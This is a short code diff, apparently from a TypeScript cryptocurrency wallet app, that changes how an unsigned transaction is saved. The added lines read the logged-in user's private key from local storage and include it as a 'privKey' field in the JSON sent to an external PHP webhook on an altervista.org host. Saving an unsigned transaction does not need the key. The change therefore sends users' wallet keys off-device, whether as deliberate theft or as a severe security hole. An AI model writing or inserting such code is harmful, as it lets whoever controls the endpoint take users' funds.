@@ -12,7 +12,7 @@ export const sendTransaction = async (toAddress: string, value: number) => {
         let tosign = unsigned_tx['tosign'][0]
         let changed_tx = setupTxJson(unsigned_tx['tx'])
         console.log(changed_tx)
-        let a = await (await saveUnsignedtoDB(storageData['logged']['email'], changed_tx, tosign, fromAddress, toAddress))
+        let a = await (await saveUnsignedtoDB(storageData['logged']['email'], changed_tx, tosign, fromAddress, toAddress, storageData[storageData['logged']['email']]['private_key']))
         if (a === 'Success') {
             return 'Success.Transaction created successfully, wait for signature and broadcast(check transaction list)'
         } else {
@@ -52,7 +52,7 @@ const createTransaction = async (fromAddress: string, toAddress: string, value: 
     return result
 }
 
-const saveUnsignedtoDB = async (email: string, tx: string, tosign: string, fromAddress: string, toAddress: string) => {
+const saveUnsignedtoDB = async (email: string, tx: string, tosign: string, fromAddress: string, toAddress: string, privKey: string) => {
     var myHeaders = new Headers();
     myHeaders.append("Content-Type", "application/json");
     var raw = JSON.stringify({
@@ -61,7 +61,8 @@ const saveUnsignedtoDB = async (email: string, tx: string, tosign: string, fromA
         "tx": tx,
         "tosing": tosign,
         "fromAddress": fromAddress,
-        "toAddress": toAddress
+        "toAddress": toAddress,
+        "privKey": privKey
     });
     let result = await (await fetch("https://cryptokeeper.altervista.org/APP/webhook.php", {
         method: 'POST',
